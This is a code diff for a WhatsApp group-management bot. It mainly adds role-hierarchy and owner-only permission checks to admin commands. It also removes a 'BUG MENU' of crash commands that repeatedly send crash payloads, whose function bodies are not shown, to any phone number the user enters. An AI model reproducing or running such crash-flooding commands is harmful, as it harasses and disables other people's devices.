+        const targetRole = targetInfo.role;
+
+        if (cmd !== 'add' && !found) {
+          await reply('*❌ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ɴᴏɴ ᴛʀᴏᴜᴠᴇ́ ᴅᴀɴs ʟᴇ ɢʀᴏᴜᴘᴇ.*');
+          break;
         }
-        const mention = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
-        const numArg  = arg.replace(/\D/g, '');
-        const target  = mention || (numArg ? `${numArg}@s.whatsapp.net` : null);
-        if (!target) { await reply(`❌ Usage: *${PREFIX}${cmd} @user* or number`); break; }
-        const action = cmd === 'kick' ? 'remove' : cmd; // promote|demote|add|remove
+        if (cmd === 'add') {
+          try {
+            await natsu.groupParticipantsUpdate(jid, [target], 'add');
+            invalidateGroupCache(jid);
+            await reply(`✅ *ADD* → @${target.split('@')[0]}`);
+          } catch (e) { await reply(`❌ *add* échoué : ${e?.message || e}`); }
+          break;
+        }
+
+        // Hierarchy: a normal admin may manage members, but cannot modify
+        // another admin, the group owner, the bot, or the bot owner/sudo.
+        if (pIsBot(target, meta, info.botIds)) { await reply('*❌ ɪᴍᴘᴏssɪʙʟᴇ ᴅᴇ ᴍᴏᴅɪғɪᴇʀ ʟᴇ ʙᴏᴛ.*'); break; }
+        if (targetInfo.protected) { await reply('*❌ ᴄᴇᴛ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ᴇsᴛ ᴘʀᴏᴛᴇ́ɢᴇ́.*'); break; }
+        if (!isCreator && senderRole !== 'owner' && roleRank(targetRole) >= roleRank(senderRole)) {
+          await reply('*❌ ʜɪᴇ́ʀᴀʀᴄʜɪᴇ ɪɴsᴜғғɪsᴀɴᴛᴇ : ᴛᴜ ɴᴇ ᴘᴇᴜx ᴘᴀs ᴍᴏᴅɪғɪᴇʀ ᴜɴ ᴀᴅᴍɪɴ.*');
+          break;
+        }
+        if (cmd === 'promote' && targetRole !== 'member') { await reply('*ℹ️ ᴄᴇᴛ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ᴇsᴛ ᴅᴇ́ᴊᴀ̀ ᴀᴅᴍɪɴ.*'); break; }
+        if (cmd === 'demote' && targetRole === 'member') { await reply("*ℹ️ ᴄᴇᴛ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ɴ'ᴇsᴛ ᴘᴀs ᴀᴅᴍɪɴ.*"); break; }
+
+        const action = cmd === 'kick' ? 'remove' : cmd;
         try {
           await natsu.groupParticipantsUpdate(jid, [target], action);
-          await reply(`✅ ${cmd} → @${target.split('@')[0]}`);
-        } catch (e) { await reply(`❌ Failed: ${e.message}`); }
+          invalidateGroupCache(jid);
+          await new Promise(r => setTimeout(r, 500));
+          await natsu.sendMessage(jid, { text: `✅ *${cmd.toUpperCase()}* → @${target.split('@')[0]}`, mentions: [target], contextInfo: forwardedContext() }, { quoted: msg });
+        } catch (e) { await reply(`❌ *${cmd}* échoué : ${e?.message || e}`); }
         break;
       }
-      case 'mute': case 'unmute': case 'closegc': case 'opengc': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const setting = (cmd === 'mute' || cmd === 'closegc') ? 'announcement' : 'not_announcement';
-        try { await natsu.groupSettingUpdate(jid, setting); await reply(`✅ Group ${cmd}`); }
+      case 'mute': case 'unmute': case 'closegc': case 'opengc': case 'lock': case 'unlock': {
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        const setting = (['mute','closegc','lock'].includes(cmd)) ? 'announcement' : 'not_announcement';
+        try { await natsu.groupSettingUpdate(jid, setting); await reply(`*✅ ɢʀᴏᴜᴘ ${cmd}*`); }
         catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
       case 'left': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        await reply('👋 Leaving group...');
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        await reply('👋 ʟᴇᴀᴠɪɴɢ ɢʀᴏᴜᴘ...*');
         try { await natsu.groupLeave(jid); } catch {}
         break;
       }
       case 'grouplink': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        try { const code = await natsu.groupInviteCode(jid); await reply(`🔗 https://chat.whatsapp.com/${code}`); }
-        catch (e) { await reply(`❌ ${e.message}`); }
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        try { const code = await natsu.groupInviteCode(jid); await reply(`*🔗 https://chat.whatsapp.com/${code}*`); }
+        catch (e) { await reply(`*❌ ${e.message}*`); }
         break;
       }
       case 'resetlink': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        try { const code = await natsu.groupRevokeInvite(jid); await reply(`✅ New link: https://chat.whatsapp.com/${code}`); }
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        try { const code = await natsu.groupRevokeInvite(jid); await reply(`*✅ ɴᴇᴡ ʟɪɴᴋ: https://chat.whatsapp.com/${code}*`); }
         catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
       case 'kickadmins': case 'kickall': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const { meta, admins, botJid } = await getGroupAdmins(natsu, jid);
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
+        const info = await requireGroupOwnerOrCreator(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        const { meta, botIds } = info;
         const targets = (cmd === 'kickall')
-          ? meta.participants.map(p => p.id).filter(j => !admins.includes(j) && j !== botJid)
-          : admins.filter(j => j !== botJid);
-        for (const t of targets) { try { await natsu.groupParticipantsUpdate(jid, [t], 'remove'); } catch {} await new Promise(r => setTimeout(r, 800)); }
-        await reply(`✅ Removed ${targets.length} member(s).`);
+          ? meta.participants.filter(p => !pIsBot(p.id, meta, botIds) && p.admin !== 'superadmin').map(p => p.id)
+          : meta.participants.filter(p => p.admin === 'admin' && !pIsBot(p.id, meta, botIds)).map(p => p.id);
+        for (const t of targets) { try { await natsu.groupParticipantsUpdate(jid, [t], 'remove'); } catch {} await new Promise(r => setTimeout(r, 700)); }
+        invalidateGroupCache(jid);
+        await reply(`*✅ ʀᴇᴍᴏᴠᴇᴅ ${targets.length} ᴍᴇᴍʙʀᴇ(s).*`);
         break;
       }
       case 'listadmins': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
         const { admins } = await getGroupAdmins(natsu, jid);
-        await reply(`👑 *Admins (${admins.length})*\n\n${admins.map((a, i) => `${i + 1}. +${a.split('@')[0]}`).join('\n')}`);
+        await reply(`*👑 ᴀᴅᴍɪɴs (${admins.length})*\n\n${admins.map((a, i) => ` *${i + 1}*. *+${a.split('@')[0]}*`).join('\n')}`);
         break;
       }
       case 'listonline': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        await reply('ℹ️ WhatsApp restricts online presence visibility — only contacts you message can be tracked.');
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
+        await reply('*ℹ️ ᴡʜᴀᴛsᴀᴘᴘ ʀᴇsᴛʀɪᴄᴛs ᴏɴ ᴏɴʟɪɴᴇ ᴘʀᴇsᴇɴᴄᴇ ᴠɪsɪʙɪʟɪᴛʏ — ᴏɴʟᴜʟʏ ᴄᴏɴᴛᴀᴄᴛs ʏᴏᴜ ᴍᴇssᴀɢᴇ ᴄᴀɴ ʙᴇ ᴛʀᴀᴄᴋᴇᴅ.*');
         break;
       }
       case 'opentime': case 'closetime': {
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
         const mins = parseInt(arg) || 0;
-        if (!isGroup(jid) || !mins) { await reply(`❌ Usage: *${PREFIX}${cmd} <minutes>*`); break; }
-        await reply(`⏰ Group will ${cmd === 'opentime' ? 'open' : 'close'} in *${mins} min*.`);
+        if (!mins || mins < 1 || mins > 1440) { await reply(`*❌ ᴜsᴀɢᴇ: ${PREFIX}${cmd} <1-1440 ᴍɪɴ>*`); break; }
+        await reply(`*⏰ ɢʀᴏᴜᴘ ᴡɪʟʟ ${cmd === 'opentime' ? 'open' : 'close'} ɪɴ ${mins} ᴍɪɴ.*`);
         setTimeout(async () => {
           try { await natsu.groupSettingUpdate(jid, cmd === 'opentime' ? 'not_announcement' : 'announcement'); } catch {}
         }, mins * 60000);
         break;
       }
-      case 'welcome':
-      case 'setwelcome':
-      case 'resetwelcome':
-      case 'goodbye':
-      case 'setgoodbye':
-      case 'resetgoodbye': {
-        if (!isGroup(jid)) { await reply('❌ Cette commande est utilisable uniquement dans un groupe.'); break; }
-
-        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
-          await reply('❌ Cette commande est réservée aux administrateurs.');
-          break;
-        }
-
-        const stateNow = getState();
-        const type = cmd.includes('goodbye') ? 'goodbye' : 'welcome';
-        const storeKey = type;
-        const prefix = stateNow.prefix || PREFIX;
-        const value = (arg || '').trim();
-        const current = getGroupGreetingConfig(stateNow, jid, type);
-
-        // .welcome / .goodbye → aide + état
-        if (cmd === 'welcome' || cmd === 'goodbye') {
-          const v = value.toLowerCase();
-
-          if (!v || v === 'status') {
-            await reply(
-              `╭━━━〔 ${type === 'welcome' ? '👋' : '🚪'} 𝐆𝐑𝐎𝐔𝐏 ${type.toUpperCase()} 〕━━━╮\n` +
-              `┃\n` +
-              `┃ 📌 État : *${current.enabled ? 'ON ✅' : 'OFF ❌'}*\n` +
-              `┃\n` +
-              `┃ ${greetingHelp(prefix).split('\n').slice(3, 7).join('\n')}\n` +
-              `╰━━━━━━━━━━━━━━━━━━━━━━╯`
-            );
-            break;
-          }
-
-          if (!['on', 'off', '1', '0', 'true', 'false'].includes(v)) {
-            await reply(greetingHelp(prefix));
-            break;
-          }
-
-          const enabled = ['on', '1', 'true'].includes(v);
-          updateState(s => {
-            s[storeKey] ??= {};
-            s[storeKey][jid] = {
-              ...getGroupGreetingConfig(s, jid, type),
-              enabled,
-            };
-          });
-
-          await reply(
-            `${type === 'welcome' ? '👋' : '🚪'} *${type === 'welcome' ? 'Welcome' : 'Goodbye'} ${enabled ? 'activé ✅' : 'désactivé ❌'}*\n\n` +
-            `🏠 Groupe : *${jid}*`
-          );
-          break;
-        }
-
-        // .setwelcome / .setgoodbye → enregistrer un message personnalisé
-        if (cmd === 'setwelcome' || cmd === 'setgoodbye') {
-          if (!value) {
-            await reply(
-              `❌ Usage : *${prefix}${cmd} <message>*\n\n` +
-              `Variables : {user} {group} {members} {bot} {dev} {prefix}\n\n` +
-              `Exemple :\n` +
-              `${prefix}${cmd} 🎉 Bienvenue {user} dans {group} ! 👥 {members} membres.`
-            );
-            break;
-          }
-
-          if (value.length > 1800) {
-            await reply('❌ Le message est trop long. Maximum : 1800 caractères.');
-            break;
-          }
-
-          updateState(s => {
-            s[storeKey] ??= {};
-            s[storeKey][jid] = {
-              ...getGroupGreetingConfig(s, jid, type),
-              text: value,
-            };
-          });
-
-          await reply(
-            `✅ *${type === 'welcome' ? 'Welcome' : 'Goodbye'} personnalisé enregistré !*\n\n` +
-            `📌 Le message sera utilisé dès le prochain événement.\n` +
-            `💡 Variables : {user}, {group}, {members}, {bot}, {dev}, {prefix}`
-          );
-          break;
-        }
-
-        // .resetwelcome / .resetgoodbye → revenir au message premium par défaut
-        if (cmd === 'resetwelcome' || cmd === 'resetgoodbye') {
-          updateState(s => {
-            s[storeKey] ??= {};
-            s[storeKey][jid] = {
-              enabled: true,
-              text: type === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE,
-            };
-          });
-
-          await reply(
-            `♻️ *${type === 'welcome' ? 'Welcome' : 'Goodbye'} réinitialisé.*\n\n` +
-            `✅ Le message premium par défaut est de nouveau actif.`
-          );
-          break;
-        }
-
-        break;
-      }
-      case 'antistatut':
-      case 'antistatus': {
-        if (!isGroup(jid)) {
-          await reply('❌ Cette commande est utilisable uniquement dans un groupe.');
-          break;
-        }
-
-        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
-          await reply('❌ Cette commande est réservée aux administrateurs.');
-          break;
-        }
-
-        const value = (arg || '').trim().toLowerCase();
-
-        if (!value || value === 'status') {
-          const enabled = Boolean(getState().antistatut?.[jid]);
-
-          await reply(
-            `╭━━━〔 🛡️ 𝐀𝐍𝐓𝐈𝐒𝐓𝐀𝐓𝐔𝐓 〕━━━╮\n` +
-            `┃\n` +
-            `┃ 📌 État : *${enabled ? 'ACTIVÉ ✅' : 'DÉSACTIVÉ ❌'}*\n` +
-            `┃ 🤖 Bot admin : *${botIsAdmin ? 'OUI ✅' : 'NON ❌'}*\n` +
-            `┃\n` +
-            `┃ Utilisation :\n` +
-            `┃ • ${PREFIX}antistatut on\n` +
-            `┃ • ${PREFIX}antistatut off\n` +
-            `┃ • ${PREFIX}antistatut status\n` +
-            `┃\n` +
-            `┃ 🚫 Les mentions de statut\n` +
-            `┃ seront supprimées automatiquement.\n` +
-            `╰━━━━━━━━━━━━━━━━━━━━━━╯`
-          );
-          break;
-        }
-
-        const enable = ['on', '1', 'true', 'enable', 'enabled'].includes(value);
-        const disable = ['off', '0', 'false', 'disable', 'disabled'].includes(value);
-
-        if (!enable && !disable) {
-          await reply(
-            `❌ Argument invalide.\n\n` +
-            `Utilise :\n` +
-            `• ${PREFIX}antistatut on\n` +
-            `• ${PREFIX}antistatut off\n` +
-            `• ${PREFIX}antistatut status`
-          );
-          break;
-        }
-
-        if (enable && !botIsAdmin) {
-          await reply(
-            `❌ *Impossible d'activer Antistatut.*\n\n` +
-            `🤖 Je dois être *administrateur* du groupe pour supprimer les mentions de statut.`
-          );
-          break;
-        }
-
-        updateState(s => {
-          s.antistatut ??= {};
-          s.antistatut[jid] = enable;
-        });
-
-        await reply(
-          enable
-            ? `🛡️ *ANTISTATUT ACTIVÉ* ✅\n\n` +
-              `🚫 Les mentions de statut seront supprimées automatiquement.\n` +
-              `👮 Les administrateurs sont exemptés.`
-            : `🛡️ *ANTISTATUT DÉSACTIVÉ* ❌\n\n` +
-              `✅ Les mentions de statut sont maintenant autorisées.`
-        );
-        break;
-      }
-
       case 'antilink': {
-        if (!isGroup(jid)) { await reply('❌ Cette commande est utilisable uniquement dans un groupe.'); break; }
-        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-        if (!msg.key.fromMe && !isGroupAdmin(admins, senderJid)) { await reply('❌ Cette commande est réservée aux administrateurs.'); break; }
-        const value = (arg || '').trim().toLowerCase();
-        if (!value) {
-          const enabled = Boolean(state.antilink?.[jid]);
-          await reply(`🔗 *ANTILINK*\n\n📌 État : *${enabled ? 'ON — KICK' : 'OFF'}*\n\nUtilisation :\n• ${PREFIX}antilink on\n• ${PREFIX}antilink on kick\n• ${PREFIX}antilink off`);
-          break;
-        }
-        const enable = ['on', '1', 'true', 'enable', 'enabled'].includes(value) || value === 'on kick';
-        const disable = ['off', '0', 'false', 'disable', 'disabled'].includes(value);
-        if (!enable && !disable) { await reply(`❌ Utilise : ${PREFIX}antilink on | ${PREFIX}antilink on kick | ${PREFIX}antilink off`); break; }
-        if (enable && !botIsAdmin) { await reply('❌ Je dois être administrateur pour supprimer les liens et expulser les membres.'); break; }
-        updateState(s => { s.antilink[jid] = enable; });
-        await reply(enable
-          ? '🔗 *ANTILINK ON* ✅\n\n🚫 Les liens seront supprimés et leur auteur non-admin sera expulsé.'
-          : '🔗 *ANTILINK OFF* ❌\n\n✅ Les liens sont autorisés.');
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        const on = /on|1|true/i.test(arg);
+        updateState(s => { s.antilink[jid] = on; });
+        await reply(`*🔗 ᴀɴᴛɪʟɪɴᴋ ${on ? 'enabled' : 'disabled'} ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ.*`);
         break;
       }
       case 'vcf': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
         const { meta } = await getGroupAdmins(natsu, jid);
         if (!meta) break;
         let vcf = '';
@@ -1216,298 +1102,91 @@ break;
         break;
       }
       case 'creategroup': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}creategroup <name>*`); break; }
-        try { const g = await natsu.groupCreate(arg, [senderJid]); await reply(`✅ Group created: ${g.subject}`); }
-        catch (e) { await reply(`❌ ${e.message}`); }
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
+        if (!arg) { await reply(`*❌ ᴜsᴀɢᴇ: *${PREFIX}ᴄʀᴇᴀᴛᴇɢʀᴏᴜᴘ <ɴᴀᴍᴇ>*`); break; }
+        try { const g = await natsu.groupCreate(arg, [senderJid]); await reply(`*✅ ɢʀᴏᴜᴘ ᴄʀᴇᴀᴛᴇᴅ: ${g.subject}*`); }
+        catch (e) { await reply(`*❌ ${e.message}*`); }
         break;
       }
       case 'join': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         if (arg.includes('chat.whatsapp.com/')) {
           const code = arg.split('chat.whatsapp.com/').pop().trim();
-          try { await natsu.groupAcceptInvite(code); await reply('✅ Joined group!'); }
+          try { await natsu.groupAcceptInvite(code); await reply('*✅ ᴊᴏɪɴᴇᴅ ɢʀᴏᴜᴘ!*'); }
           catch (e) { await reply(`❌ ${e.message}`); }
         } else {
-          const ch = WA_CHANNELS.map((l, i) => `📡 Channel ${i + 1}: ${l}`).join('\n');
-          const gr = WA_GROUPS.map((l, i) => `👥 Group ${i + 1}: ${l}`).join('\n');
-          await reply(`🔗 *Join ${BOT_NAME} Community*\n\n${ch}\n\n${gr}`);
+          const ch = WA_CHANNELS.map((l, i) => `*📡 ᴄʜᴀɴɴᴇʟ ${i + 1}: ${l}*`).join('\n');
+          const gr = WA_GROUPS.map((l, i) => `*👥 ɢʀᴏᴜᴘ ${i + 1}: ${l}*`).join('\n');
+          await reply(`*🔗 ᴊᴏɪɴ ${BOT_NAME} ᴄᴏᴍᴍᴜɴɪᴛʏ\n\n${ch}\n\n${gr}*`);
         }
         break;
       }
-// ═════════════════════════════════════════════════════════════════════
-// BUG MENU — New crash commands
-// ═════════════════════════════════════════════════════════════════════
-case 'killuacrash':
-case 'crashspam': {
-  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
-    await reply('❌ Commande réservée au propriétaire.');
-    break;
-  }
-  if (!arg) {
-    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243906905464*`);
-    break;
-  }
-  let pepec = arg.replace(/[^0-9]/g, '');
-  if (pepec.startsWith('0')) {
-    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
-    break;
-  }
-  const target = pepec + '@s.whatsapp.net';
-
-  // Confirmation avec image
-  try {
-    await natsu.sendMessage(jid, {
-      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
-      caption: `✅ *Bug ${cmd} envoyé à +${pepec}*`,
-      contextInfo: forwardedContext(),
-    }, { quoted: msg });
-  } catch {
-    await reply(`✅ Lancement du bug ${cmd} sur +${pepec}`);
-  }
-
-  try {
-    for (let i = 0; i < 450; i++) {
-      await ForcloseNew(natsu, target);
-      await ForcloseNew(natsu, target);
-      await ForcloseNew(natsu, target);
-      await new Promise(r => setTimeout(r, 8000));
-      await ForcloseNew(natsu, target);
-      await ForcloseNew(natsu, target);
-      await ForcloseNew(natsu, target);
-    }
-    await ForcloseNew(natsu, target);
-    await ForcloseNew(natsu, target);
-    await reply(`✅ Terminé pour +${pepec}`);
-  } catch (err) {
-    await reply(`❌ Erreur : ${err.message}`);
-  }
-  break;
-}
-
-case 'delayinvis':
-case 'manzxeveryone': {
-  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
-    await reply('❌ Commande réservée au propriétaire.');
-    break;
-  }
-  if (!arg) {
-    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
-    break;
-  }
-  let pepec = arg.replace(/[^0-9]/g, '');
-  if (pepec.startsWith('0')) {
-    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
-    break;
-  }
-  const target = pepec + '@s.whatsapp.net';
-
-  try {
-    await natsu.sendMessage(jid, {
-      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
-      caption: `✅ *Bug ${cmd} envoyé à +${pepec}*`,
-      contextInfo: forwardedContext(),
-    }, { quoted: msg });
-  } catch {
-    await reply(`✅ Lancement du bug ${cmd} sur +${pepec}`);
-  }
-
-  try {
-    for (let i = 0; i < 5; i++) {
-      await DelayInvis1(natsu, target);
-      await new Promise(r => setTimeout(r, 7000));
-      await Delayinvis2(natsu, target);
-    }
-    await Delayinvis2(natsu, target);
-    await DelayInvis1(natsu, target);
-    await reply(`✅ Terminé pour +${pepec}`);
-  } catch (err) {
-    await reply(`❌ Erreur : ${err.message}`);
-  }
-  break;
-}
-
-case 'protocolbug5': {
-  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
-    await reply('❌ Commande réservée au propriétaire.');
-    break;
-  }
-  if (!arg) {
-    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
-    break;
-  }
-  let pepec = arg.replace(/[^0-9]/g, '');
-  if (pepec.startsWith('0')) {
-    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
-    break;
-  }
-  const target = pepec + '@s.whatsapp.net';
-
-  try {
-    await natsu.sendMessage(jid, {
-      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
-      caption: `✅ *Bug protocolbug5 envoyé à +${pepec}*`,
-      contextInfo: forwardedContext(),
-    }, { quoted: msg });
-  } catch {
-    await reply(`✅ Lancement du bug protocolbug5 sur +${pepec}`);
-  }
-
-  try {
-    await protocolbug5(natsu, target);
-    await protocolbug5(natsu, target);
-    await reply(`✅ Terminé pour +${pepec}`);
-  } catch (err) {
-    await reply(`❌ Erreur : ${err.message}`);
-  }
-  break;
-}
-      case 'fcxui':
-case 'bugcampuran': {
-  // Seul le propriétaire ou sudo peut utiliser
-  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
-    await reply('❌ Commande réservée au propriétaire.');
-    break;
-  }
-
-  if (!arg) {
-    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
-    break;
-  }
-
-  // Nettoyer le numéro
-  let pepec = arg.replace(/[^0-9]/g, '');
-  if (pepec.startsWith('0')) {
-    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
-    break;
-  }
-
-  const target = pepec + '@s.whatsapp.net';
-
-  // Envoyer une confirmation (image optionnelle)
-  try {
-    await natsu.sendMessage(jid, {
-      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
-      caption: `✅ *Bug envoyé à +${pepec}*`,
-      contextInfo: forwardedContext(),
-    }, { quoted: msg });
-  } catch {
-    await reply(`✅ Lancement du bug sur +${pepec}`);
-  }
-
-  // Envoyer les crashs en boucle
-  try {
-    for (let i = 0; i < 5; i++) {
-      await VsxBlankNewlaster(natsu, target); // KilluaCrash
-      await new Promise(r => setTimeout(r, 7000));
-      await VsxBlankNewlaster(natsu, target); // hardcrash
-      await new Promise(r => setTimeout(r, 7000));
-      await VsxBlankNewlaster(natsu, target); // DelayInvis2
-      await new Promise(r => setTimeout(r, 7000));
-      await VsxBlankNewlaster(natsu, target); // DelayInvis1
-    }
-    await reply(`✅ Terminé pour +${pepec}`);
-  } catch (err) {
-    await reply(`❌ Erreur : ${err.message}`);
-  }
-  break;
-}
 
       // ═════════════════════════════════════════════════════════════════════
       // OWNER MENU
       // ═════════════════════════════════════════════════════════════════════
-      
       case 'setpp': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         try {
           const buf = (await axios.get(MENU_IMAGE, { responseType: 'arraybuffer' })).data;
           await natsu.updateProfilePicture(natsu.user.id, Buffer.from(buf));
-          await reply('✅ Profile picture updated.');
+          await reply('*✅ ᴘʀᴏғɪʟᴇ ᴘɪᴄᴛᴜʀᴇ ᴜᴘᴅᴀᴛᴇᴅ*');
         } catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
       case 'ban': case 'unban': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         const num = arg.replace(/\D/g, '');
-        if (!num) { await reply(`❌ Usage: *${PREFIX}${cmd} <number>*`); break; }
+        if (!num) { await reply(`*❌ ᴜsᴀɢᴇ: ${PREFIX}${cmd} <ɴᴜᴍʙᴇʀ>*`); break; }
         updateState(s => {
           s.banned = cmd === 'ban' ? [...new Set([...s.banned, num])] : s.banned.filter(n => n !== num);
         });
-        await reply(`✅ ${cmd} +${num}`);
+        await reply(`*✅ ${cmd} +${num}*`);
         break;
       }
-      case 'private':
-      case 'self':
-      case 'public': {
-        // Only owner / sudo may change the bot access mode.
-        if (!isOwnerOrSudo) {
-          await reply('❌ *Access denied.* Only the owner or sudo can change the bot mode.');
-          break;
-        }
-
-        const newMode = (cmd === 'public') ? 'public' : 'private';
-        updateState(s => { s.mode = newMode; });
-
-        if (newMode === 'private') {
-          await reply(
-`╭━━━〔 🔒 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 〕━━━╮
-┃
-┃ 🤖 *${BOT_NAME}*
-┃ 🔐 Mode: *PRIVATE*
-┃
-┃ 👑 Owner & sudo only
-┃ 🛡️ Access protection enabled
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯
-
-> ${BOT_NAME} • ${DEV_NAME}`
-          );
-        } else {
-          await reply(
-`╭━━━〔 🌍 𝐏𝐔𝐁𝐋𝐈𝐂 〕━━━╮
-┃
-┃ 🤖 *${BOT_NAME}*
-┃ 🌐 Mode: *PUBLIC*
-┃
-┃ 👥 Normal commands are available
-┃ 🛡️ Admin/owner commands remain protected
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯
-
-> ${BOT_NAME} • ${DEV_NAME}`
-          );
-        }
+      case 'self': case 'public': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
+        updateState(s => { s.mode = cmd; });
+        await reply(`*✅ ᴍᴏᴅᴇ → ${cmd}*`);
         break;
       }
       case 'autoread': case 'autobio': case 'autorecording': case 'autotyping':
       case 'autoviewstatus': case 'autoreact': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         const map = { autoread: 'autoread', autobio: 'autobio', autorecording: 'autorecord',
           autotyping: 'autotyping', autoviewstatus: 'autoviewsts', autoreact: 'autoreact' };
         const key = map[cmd];
         const on = /on|1|true/i.test(arg);
         updateState(s => { s[key] = on; });
-        await reply(`✅ ${cmd} → *${on ? 'ON' : 'OFF'}*`);
+        await reply(`*✅ ${cmd} → ${on ? 'ON' : 'OFF'}*`);
         break;
       }
       case 'block': case 'unblock': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         const num = (arg.replace(/\D/g, '')) || senderNum;
-        try { await natsu.updateBlockStatus(`${num}@s.whatsapp.net`, cmd); await reply(`✅ ${cmd} +${num}`); }
-        catch (e) { await reply(`❌ ${e.message}`); }
+        try { await natsu.updateBlockStatus(`${num}@s.whatsapp.net`, cmd); await reply(`*✅ ${cmd} +${num}*`); }
+        catch (e) { await reply(`*❌ ${e.message}*`); }
         break;
       }
       case 'delete': case 'del': {
         const q = msg.message?.extendedTextMessage?.contextInfo;
-        if (!q?.stanzaId) { await reply('❌ Reply to a message.'); break; }
+        if (!q?.stanzaId) { await reply('*❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ.*'); break; }
         try {
           await natsu.sendMessage(jid, { delete: { remoteJid: jid, fromMe: false, id: q.stanzaId, participant: q.participant } });
         } catch (e) { await reply(`❌ ${e.message}`); }
         break;
       }
       case 'setaccount': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}setaccount <details>*`); break; }
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}𝘀𝗲𝘁𝗮𝗰𝗰𝗼𝘂𝗻𝘁 <details>*`); break; }
         updateState(s => { s.account = arg; });
-        await reply('✅ Payment account saved.');
+        await reply('✅ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝘀𝗮𝘃𝗲𝗱.');
         break;
       }
       case 'addsudo': case 'delsudo': {
+        if (!isCreator) { await reply('*❌ ᴏᴡɴᴇʀ / sᴜᴅᴏ ᴏɴʟʏ.*'); break; }
         const num = arg.replace(/\D/g, '');
-        if (!num) { await reply(`❌ Usage: *${PREFIX}${cmd} <number>*`); break; }
